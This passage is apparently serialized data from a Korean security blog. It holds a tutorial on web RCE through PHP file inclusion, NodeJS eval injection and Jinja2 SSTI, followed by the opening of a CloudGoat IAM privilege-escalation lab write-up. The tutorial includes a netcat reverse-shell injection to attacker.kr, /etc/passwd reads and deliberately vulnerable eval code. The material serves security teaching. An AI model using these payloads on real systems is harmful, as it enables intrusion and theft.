9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시도 해 볼 만한 함수</h4>\n<ul>\n<li><code class=\"language-text\">echo \"data\";</code> : 문자 출력</li>\n<li><code class=\"language-text\">phpinfo();</code> : php 정보 출력</li>\n<li><code class=\"language-text\">system(\"id\")</code> : system 명령어 수행</li>\n<li><code class=\"language-text\">passthru(\"id\")</code> : passthru 명령어 수행</li>\n<li><code class=\"language-text\">file_put_contents(\"/tmp/test.txt\", \"data\")</code> : 파일 쓰기(생성)</li>\n<li><code class=\"language-text\">file_get_contents(\"/tmp/test.txt\")</code> : 파일 읽기</li>\n</ul>\n<h2 id=\"rce-case2-nodejs\" style=\"position:relative;\"><a href=\"#rce-case2-nodejs\" aria-label=\"rce case2 nodejs permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>RCE Case2 #NodeJS</h2>\n<h3 id=\"nodejs-code-injection\" style=\"position:relative;\"><a href=\"#nodejs-code-injection\" aria-label=\"nodejs code injection permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>NodeJS Code Injection</h3>\n<p><strong>request</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">//> http://victim.kr/api/v1/data/require(\"child_process\").exec(\"nc -e /bin/sh attacker.kr 8080\")</span></code></pre></div>\n<p><strong>attacker server</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"># nc <span class=\"token operator\">-</span>lvp <span class=\"token number\">8888</span></code></pre></div>\n<ul>\n<li>대상 서버상 내부적으로 처리하는 구간에서 <code class=\"language-text\">경로</code>,<code class=\"language-text\">쿼리</code>등의 데이터가 내부 javascript로 해석되어 실행되는 구간이 존재하는 경우 위와 같은 공격을 이용하여 RCE이 수행이 가능</li>\n</ul>\n<p><strong>victim.kr 내부 구현</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token operator\">...</span>\n<span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>data_input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// data_input은 위의 request에서 전달받은 데이터</span>\n<span class=\"token operator\">...</span></code></pre></div>\n<ul>\n<li>대상 서버 내부 구현은 다음과 같이 입력 된 데이터가 <code class=\"language-text\">eval</code> api를 통한 문자열이 javascript로 해석되어 실행되는 구간으로 동작하기 때문</li>\n</ul>\n<h4 id=\"nodejs-code-injection-technique\" style=\"position:relative;\"><a href=\"#nodejs-code-injection-technique\" aria-label=\"nodejs code injection technique permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>NodeJS Code Injection technique</h4>\n<h4 id=\"fs-class\" style=\"position:relative;\"><a href=\"#fs-class\" aria-label=\"fs class permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><strong>fs class</strong></h4>\n<ul>\n<li>공격시 대상 서버의 파일을 읽는 경우 <code class=\"language-text\">require('fs')</code> 모듈을 활용하여 파일 시스템(파일 읽기, 쓰기, 삭제)을 제어할 수 있으며 다양한 방식으로 활용된다.</li>\n</ul>\n<p><strong>readdir()</strong></p>\n<ul>\n<li>fs class의 <code class=\"language-text\">readdir()</code>, <code class=\"language-text\">readdirSync()</code> 메서드를 통해 대상 서버의 디렉터리 내용을 나열할 수 있다. 후자가 동기식 버전 말고는 동일하다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> fs <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'fs'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nfs<span class=\"token punctuation\">.</span><span class=\"token function\">readdir</span><span class=\"token punctuation\">(</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token string\">'utf8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nfs<span class=\"token punctuation\">.</span><span class=\"token function\">readdir</span><span class=\"token punctuation\">(</span><span class=\"token string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token string\">'utf8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p><strong>readFile()</strong></p>\n<ul>\n<li>공격자는 앞서 서버 디렉토리 구조를 파악한 후 <code class=\"language-text\">readFile()</code>, <code class=\"language-text\">readFileSync()</code> 메서드를 활용하여 파일의 내용을 읽을 수 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> fs <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'fs'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nfs<span class=\"token punctuation\">.</span><span class=\"token function\">readFile</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/etc/passwd'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token string\">'utf8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p><strong>Child Process</strong></p>\n<ul>\n<li>공격자는 <code class=\"language-text\">child_process</code> 모듈을 사용해 Node.js 에서 작식 프로세스를 생성하여 자식 프로세스로 <code class=\"language-text\">spawn(), fork(), exec(), execFile()</code> 등의 메서드를 실행할 수 있다.</li>\n<li><code class=\"language-text\">spawn()</code> 함수는 Stream 데이터를 반환하고 <code class=\"language-text\">exec()</code> 함수는 전체 버퍼 출력을 반환한다.</li>\n</ul>\n<h4 id=\"ncat\" style=\"position:relative;\"><a href=\"#ncat\" aria-label=\"ncat permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><strong>Ncat</strong></h4>\n<ul>\n<li>공격자는 앞서 페이로드를 구성한후 자신의 서버로 대상 서버를 연결하기 위해 Revers Shell을 설정하기 위해 Ncat를 활용한다.</li>\n<li></li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// > http://victim.kr/api/v1/data/require(\"child_process\").exec(\"nc -e /bin/sh attacker.kr 8080\")</span>\n<span class=\"token comment\">// &lt; nc -lvp 8888</span></code></pre></div>\n<h2 id=\"rce-case3-flaskjinja2\" style=\"position:relative;\"><a href=\"#rce-case3-flaskjinja2\" aria-label=\"rce case3 flaskjinja2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>RCE Case3 #Flask/Jinja2</h2>\n<h3 id=\"flask-server-side-template-injection\" style=\"position:relative;\"><a href=\"#flask-server-side-template-injection\" aria-label=\"flask server side template injection permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Flask Server Side Template Injection</h3>\n<ul>\n<li>Server Side Template Injection을 서버에서 임의 코드를 실행 할 수 있는 사용자 입력 값에 Template keyword를 삽입해서 Tempalte Engine에서 해당 입력 값을 기반으로 데이터를 렌더링되어 실행된다.</li>\n</ul>\n<p><strong>victim.kr 내부 서버 구현</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> render_template_string<span class=\"token punctuation\">(</span>\n        <span class=\"token string\">'&lt;h1>{{ request.args.get(\"input\") }}&lt;/h1>'</span>\n    <span class=\"token punctuation\">)</span></code></pre></div>\n<p><strong>request</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\"># http://victim.kr/?input={{4*4}}</span></code></pre></div>\n<p><strong>response</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\"># > &lt;h1>16&lt;/h1></span></code></pre></div>\n<ul>\n<li>대상 내부 서버에서는 input 쿼리 값으로 request get 요청을 통해 입력 받아 <code class=\"language-text\">render_template_string</code> 메서드를 활용해 rednering되어 출력된다. <code class=\"language-text\">{{4*4}}</code>을 입력하여 SSTI 수행 시 템플릿 엔지이 해당 식을 해석하여 <code class=\"language-text\">16</code>을 반환한다.</li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#web-application-rce-case\">Web Application RCE Case</a></p>\n<ul>\n<li><a href=\"#php\">PHP</a></li>\n<li><a href=\"#nodejs\">NodeJS</a></li>\n<li><a href=\"#flask\">Flask</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#rce-case1-php\">RCE Case1 #PHP</a></p>\n<ul>\n<li>\n<p><a href=\"#file-inclusion\">File Inclusion</a></p>\n</li>\n<li>\n<p><a href=\"#file-inclusion-technique\">File Inclusion technique</a></p>\n<ul>\n<li><a href=\"#%EB%A7%9B%EC%9E%88%EB%8A%94-include-%ED%95%A0-%EB%8C%80%EC%83%81-%ED%8C%8C%EC%9D%BC\">맛있는 <code class=\"language-text\">include</code> 할 대상 파일</a></li>\n<li><a href=\"#%EC%8B%9C%EB%8F%84-%ED%95%B4-%EB%B3%BC-%EB%A7%8C%ED%95%9C-%ED%95%A8%EC%88%98\">시도 해 볼 만한 함수</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p><a href=\"#rce-case2-nodejs\">RCE Case2 #NodeJS</a></p>\n<ul>\n<li>\n<p><a href=\"#nodejs-code-injection\">NodeJS Code Injection</a></p>\n<ul>\n<li><a href=\"#nodejs-code-injection-technique\">NodeJS Code Injection technique</a></li>\n<li><a href=\"#fs-class\"><strong>fs class</strong></a></li>\n<li><a href=\"#ncat\"><strong>Ncat</strong></a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p><a href=\"#rce-case3-flaskjinja2\">RCE Case3 #Flask/Jinja2</a></p>\n<ul>\n<li><a href=\"#flask-server-side-template-injection\">Flask Server Side Template Injection</a></li>\n</ul>\n</li>\n</ul>\n</div>","frontmatter":{"date":"December 25, 2021","title":"Web Application RCE Case","categories":"Web","author":"Zer0Luck","emoji":"📣"},"fields":{"slug":"/web_application_rce1/"}},"prev":{"id":"91bbce86-6f64-5ed2-8f9a-2b6a4ea1a6ca","html":"<h1 id=\"클라우드-서비스-취약점-분석-5\" style=\"position:relative;\"><a href=\"#%ED%81%B4%EB%9D%BC%EC%9A%B0%EB%93%9C-%EC%84%9C%EB%B9%84%EC%8A%A4-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-5\" aria-label=\"클라우드 서비스 취약점 분석 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>클라우드 서비스 취약점 분석 5</h1>\n<h1 id=\"scenario-4--iam-privilege-escalation-by-attachment\" style=\"position:relative;\"><a href=\"#scenario-4--iam-privilege-escalation-by-attachment\" aria-label=\"scenario 4  iam privilege escalation by attachment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[Scenario 4]:  IAM Privilege Escalation By Attachment</h1>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">Size: Medium\nDifficulty: Moderate\nCommand: $ ./cloudgoat.py create iam_privesc_by_attachment</code></pre></div>\n<h2 id=\"시나리오-개요\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%EA%B0%9C%EC%9A%94\" aria-label=\"시나리오 개요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시나리오 개요</h2>\n<h3 id=\"자원\" style=\"position:relative;\"><a href=\"#%EC%9E%90%EC%9B%90\" aria-label=\"자원 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>자원</h3>\n<ul>\n<li>vpc (EC2)</li>\n<li>1 IAM User</li>\n</ul>\n<h3 id=\"취약점\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점</h3>\n<ul>\n<li>IAM User “Kerrigan”</li>\n<li><code class=\"language-text\">iam:AttachUserPolicy</code> 권한이 있는 공격자는 액세스 권한이 있는 사용자에게 정책을 연결하고 해당 정책에 대한 권한을 공격자에게 추가하여 권한을 상승시킬 수 있습니다.</li>\n</ul>\n<h3 id=\"목표\" style=\"position:relative;\"><a href=\"#%EB%AA%A9%ED%91%9C\" aria-label=\"목표 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>목표</h3>\n<ul>\n<li>EC2 instance “cg-super-critical-security-server.”를 삭제하는 것!</li>\n<li>접근 권한 구성이 갖쳐져 있는 환경에서 공격자는 <code class=\"language-text\">instance-profile-attachment</code> 권한을 활용하여 현재 권한이 아닌 높은 권한으로 새로운 EC2 인스턴스를 생성할 수 있습니다.</li>\n<li>새로운 EC2 인스턴스에서 액세스를 통해 공격자는 대상 계정 내에서 모든 관리 권한을 획득합니다.</li>\n<li><code class=\"language-text\">cg-super-critical-security-server</code> 를 삭제를 합니다.</li>\n</ul>\n<h3 id=\"exploit-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit 흐름도</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAADNElEQVQoz0WRXUhTcRjGX4O2nTmlCMp2ztHtbM751Qc2yZk5bep0+7ud4xS3cmaBfVjUIKEks2al22o0nREpdCFU2JdhCZVZkAQZQRd1EyRk0aelUU7HTv3jLKOLh/fux/O8P2AYtSwjc5UpI3P1WtgzGpebbz5gLK+9ZbHWXarkGq5abPVX0MKtQJsvI9Y1YLG5LhuMVUM6vWULAIBSwUgpiiYoihIBTVGENj1bmaZWk9xDDBma7JZSIxqvtDkf2az2ewhxIwhx9xCyjyK2btzKOscsqGa0oNA0npnKbK71z4Ima71MvnK5ABQDrdJKAGBRdkMgvrB3vq5xBDfmXsQVqv0/aOTDTWwAN7Kn8R7kw1UYY9jQ9rvE6sfNNd24qfoMdhtb3m4CgDhVVqE0BlRlFxAAsDh3533aHvw277/5BTtCX6eLDk85UWf0e00g+qnqFD+LOiJj6blsQplntstxhg9v7Ym+rwlEI8VtP496MAZtnlMWAyoZLbFMBGJt0bklx5v79/UdC3Z4m3t35bvfrbN5w2dZb7jb5p3rRSd+tCTl7EiweKZqOd/cec4X7uJ8c30Wz2er8EfN2tL4GJAk5RIqmSGSloJYmCTkwgsMxQffbOT8/OeGHn7CGeS/WDoidwBAzHrDfleIn3Z18xP1IX6a7fzZ+hhjyMp3/G1IUZSEJOWEAF2j2xRvMG9LFH5S3Dqz3XQ8MmTzRgZs3si10vbIwEb3y6w892s91zmzb0tgpsncPrM3zz2hFxwo0/VS8j+QFAxJKIoiMvQO2RWMwXwi3OMM8h+2hqIvtp+NvqwO8FMlLZMFpZ45lyOIH+zu+3XbHsAjZZ5w/Q2MIXUdK6NIUphMxoALV5KsTCOUjIpIpHRS88n5Ac7PT1Z6o5MlR77WSVbopPHGof5lFcNPFPaRsaXlw0+JosGQDECUolATclr9t6HQ7H9oIoVJE8yLTIde5VSffF9ubf9oLdr/TJOiq08QG276l5iGrzPVd/sTy4YHxYbBtqQ4ENEKDSGnmVhD8b92/yJfmSRRpuUQgqDnC6IUmQZp6qpCKXgwkB4MldcxrGjFAAEMdLJC8CBE9AcAckKIsOmrhAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"30.png\"\n        title=\"30.png\"\n        src=\"/static/6acbb3ac1999559b254d8cd6d3c3054a/37523/30.png\"\n        srcset=\"/static/6acbb3ac1999559b254d8cd6d3c3054a/e9ff0/30.png 180w,\n/static/6acbb3ac1999559b254d8cd6d3c3054a/f21e7/30.png 360w,\n/static/6acbb3ac1999559b254d8cd6d3c3054a/37523/30.png 720w,\n/static/6acbb3ac1999559b254d8cd6d3c3054a/302a4/30.png 1080w,\n/static/6acbb3ac1999559b254d8cd6d3c3054a/07a9c/30.png 1440w,\n/static/6acbb3ac1999559b254d8cd6d3c3054a/4435f/30.png 2479w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"시나리오-환경설정\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%99%98%EA%B2%BD%EC%84%A4%EC%A0%95\" aria-label=\"시나리오 환경설정 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시나리오 환경설정</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 42.22222222222223%; position: relative; bottom: 0; left: 0; background-image: 